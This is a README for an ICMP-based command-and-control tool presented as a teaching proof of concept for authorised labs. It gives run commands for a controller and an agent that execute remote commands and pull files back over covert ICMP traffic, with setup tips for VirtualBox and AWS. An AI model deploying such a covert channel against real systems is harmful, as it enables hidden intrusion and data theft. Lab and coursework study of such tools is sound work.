# icmp-c2

ICMP echo C2 for authorised labs and coursework.

A controller and an agent exchange zlib-compressed chunked streams inside
ICMP type-8 (echo request) payloads marked with `CMD!`. The controller
issues `LS|…`, `RUN|…`, or `SEND|…`; the agent streams back
`[START]` / `[CHUNK]` / `[END]`, with `RETRY` and `ACK` for reliability.
Source-IP filtering and a busy lock keep lab demos from eating their own
replies.

Teaching PoC only — not a product.

## Features

- ICMP type 8 both ways (echo request)
- zlib chunked uplink with selective RETRY of missing seq numbers
- source-IP filter on both sides
- busy lock so overlapping jobs do not corrupt the stream
- kernel `icmp_echo_ignore_all` toggled on the controller, restored on exit
- no baked-in VirtualBox IPs; everything is flags or env

## Dependencies

```bash
pip3 install scapy
# or from the suite root:
pip3 install -r requirements.txt
```

Both sides need **root** (raw sockets / sniff).

## Usage

Controller:

```bash
sudo python3 controller.py --target 192.168.56.3 --iface vboxnet1
# or:
export ICMP_C2_TARGET=192.168.56.3
export ICMP_C2_IFACE=vboxnet1
sudo -E python3 controller.py
```

Agent:

```bash
sudo python3 agent.py --server 192.168.56.1 --iface eth0
# or:
export ICMP_C2_SERVER=192.168.56.1
export ICMP_C2_IFACE=eth0
sudo -E python3 agent.py
```

Confirm the agent NIC name with `ip -br addr` — on Kali host-only it is often
`eth0`; on AWS it is often `ens5` or `eth0`.

## VirtualBox lab

Sniff and send must use the **host-only** interface (commonly `vboxnet1` on
the Ubuntu host). If you omit `--iface`, Scapy follows the default route
(usually Wi-Fi) and you will see outbound triggers but no replies in the menu.
That is the classic “black hole” failure mode for this design.

## AWS lab

- Run the controller on your EC2 instance; point the agent at the **public**
  (or Elastic) IP.
- Security group: allow ICMP echo from **your** IP only.
- Set `--iface` to the instance primary ENI name.
- Many campus / CGNAT networks drop outbound ICMP; home lab paths usually work.

## Menu

```text
=== ICMP C2 lab menu ===
1: List Directory (ls) | 2: Run Command | 3: Fetch File | 4: Exit & Restore
```

Fetched files land as `loot_*` next to the controller.

## Limitations

- ICMP seq is 16-bit; very large file fetches can wrap chunk indices
- Unsolicited echo requests may be filtered on the internet path
- Hard kill (`kill -9`) can leave `icmp_echo_ignore_all=1` until you reset it:
  `sudo sysctl -w net.ipv4.icmp_echo_ignore_all=0`

Authorised labs and coursework only — see the suite
[DISCLAIMER.md](../../DISCLAIMER.md).
